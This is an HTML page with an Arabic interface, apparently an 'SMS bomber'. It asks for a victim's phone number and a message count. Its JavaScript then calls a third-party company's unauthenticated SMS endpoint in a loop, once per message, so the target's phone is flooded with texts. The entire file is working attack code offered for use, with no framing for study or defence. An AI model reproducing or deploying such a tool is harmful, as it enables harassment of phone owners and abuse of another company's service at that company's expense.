<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SMS Sender</title>
    
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="apple-mobile-web-app-title" content="SMS Sender">

    <style>
        body {
            background-image: url('https://ifeamm.github.io/sms/background.jpg'); 
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-color: #0f172a;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            touch-action: manipulation;
            -webkit-tap-highlight-color: transparent;
        }
        .card {
            background-color: rgba(30, 41, 59, 0.85);
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            width: 90%;
            max-width: 400px;
            backdrop-filter: blur(10px);
        }
        h2 { text-align: center; margin-bottom: 20px; font-size: 1.5em; }
        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 15px;
            border: none;
            border-radius: 8px;
            box-sizing: border-box;
            background-color: #334155;
            color: white;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #3b82f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover { background-color: #2563eb; }
        #status { text-align: center; margin-top: 15px; font-size: 0.9em; min-height: 20px; }
    </style>
</head>
<body>

<div class="card">
    <h2>Enjoy, baby..🚀 </h2>
    <input type="tel" id="phone" placeholder="رقم الجوال (مثال: 55xxxxxxx)" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
    <input type="number" id="count" placeholder="عدد الرسائل" min="1" max="100">
    <button onclick="startSending()"> ⚡ بدء الإرسال </button>
    <p id="status"></p>
</div>

<script>
    async function startSending() {
        const phone = document.getElementById('phone').value;
        const count = parseInt(document.getElementById('count').value);
        const status = document.getElementById('status');

        if (!phone || !count) {
            status.innerText = "⚠️ يرجى تعبئة جميع الحقول!";
            return;
        }

        status.innerText = "📡 جاري الاتصال بالسيرفر...";
        
        for (let i = 0; i < count; i++) {
            try {
                await fetch(`https://prodokd.maanaginx.com/care/api/user/sendLinksSMS/${phone}`);
                status.innerText = `⚡ تم إرسال ${i + 1} من ${count}`;
            } catch (error) {
                console.error("فشل الإرسال", error);
                status.innerText = "❌ حدث خطأ أثناء الإرسال";
            }
        }
        status.innerText = "✅ تمت العملية بنجاح!";
    }
</script>

</body>
</html>
